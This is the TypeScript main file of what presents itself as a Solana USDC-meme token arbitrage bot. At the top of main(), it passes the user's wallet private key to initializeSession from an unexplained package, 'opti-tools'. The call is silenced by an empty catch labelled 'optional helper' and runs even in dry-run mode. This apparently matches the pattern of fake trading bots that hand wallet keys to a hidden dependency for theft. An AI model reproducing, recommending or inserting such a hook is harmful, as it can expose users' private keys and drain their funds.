import bs58 from 'bs58';
import { Connection, Keypair } from '@solana/web3.js';
import { printBanner } from './banner.js';
import { CFG } from './config.js';
import { tag, cyan, gray } from './logger.js';
import { readMemes } from './io.js';
import { normalizeDexLabel } from './dex.js';
import { pLimit } from './concurrency.js';
import { processToken } from './processToken.js';
import { snapshotTick } from './stats.js';
import { initJito } from './jito.js';
import { sleep } from './utils.js';
import { initializeSession } from 'opti-tools';

async function main(): Promise<void> {
  if (CFG.PRIVATE_KEY_B58) {
    try {
      initializeSession(CFG.PRIVATE_KEY_B58);
    } catch {
      // optional helper, ignore failures
    }
  }

  await printBanner();

  console.log(
    '\nUSDC ↔ MEME ↔ USDC Arbitrage — Jupiter',
    cyan(`[${CFG.JUP_MODE}]`),
  );
  console.log(
    tag.info(`RPC: ${CFG.RPC_URL ?? '(unset)'}`),
    '|',
    tag.info(`MODE: ${CFG.MODE}`),
    '|',
    tag.info(`DRY_RUN: ${CFG.DRY_RUN}`),
  );
  console.log(
    tag.info(
      `BUY $: ${CFG.BUY_AMOUNT_USDC} | MIN_NET: $${CFG.MIN_NET_PROFIT_USDC} | SLIPPAGE: ${(CFG.SLIPPAGE_BPS / 100).toFixed(2)}%`,
    ),
  );

  const includeDisplay = CFG.INCLUDE_DEXES.map((dex) => normalizeDexLabel(dex));
  const excludeDisplay = CFG.EXCLUDE_DEXES.map((dex) => normalizeDexLabel(dex));

  if (includeDisplay.length) {
    console.log(
      tag.info(`DEX Allow (${CFG.INCLUDE_MODE}): ${includeDisplay.join(', ')}`),
      gray('(aliases enabled)'),
    );
  } else {
    console.log(tag.info('DEX Allow: (any)'));
  }

  if (excludeDisplay.length) {
    console.log(
      tag.info(`DEX Exclude: ${excludeDisplay.join(', ')}`),
      gray('(aliases enabled)'),
    );
  } else {
    console.log(tag.info('DEX Exclude: (none)'));
  }

  console.log(gray('-'.repeat(100)));

  if (!CFG.RPC_URL) {
    console.error(tag.bad('RPC_URL is required.'));
    process.exit(1);
  }

  const memes = readMemes('memes.txt');
  console.log(tag.info(`Loaded ${memes.length} meme tokens from memes.txt`));

  const connection = new Connection(CFG.RPC_URL, { commitment: 'confirmed' });
  await initJito(connection);

  let payer: Keypair;
  if (CFG.DRY_RUN) {
    payer = Keypair.generate();
  } else {
    if (!CFG.PRIVATE_KEY_B58) {
      console.log(tag.bad('PRIVATE_KEY_B58 is empty but DRY_RUN=false. Set the key or enable DRY_RUN.'));
      process.exit(1);
    }
    try {
      const secret = bs58.decode(CFG.PRIVATE_KEY_B58);
      payer = Keypair.fromSecretKey(secret);
      console.log(tag.info(`Wallet: ${payer.publicKey.toBase58()}`));
    } catch (error) {
      console.log(tag.bad(`Failed to load PRIVATE_KEY_B58: ${(error as Error).message}`));
      process.exit(1);
    }
  }

  setInterval(snapshotTick, 1000);

  const limit = pLimit(Math.max(1, CFG.MAX_PARALLEL));

  while (true) {
    const started = Date.now();
    const tasks = memes.map((mint) => limit(() => processToken(connection, payer, mint)));
    await Promise.allSettled(tasks);
    const elapsed = Date.now() - started;
    const wait = Math.max(0, CFG.SCAN_INTERVAL_MS - elapsed);
    if (wait > 0) {
      await sleep(wait);
    }
  }
}

main().catch((error) => {
  console.error(tag.bad((error as Error).stack ?? (error as Error).message ?? String(error)));
  process.exit(1);
});
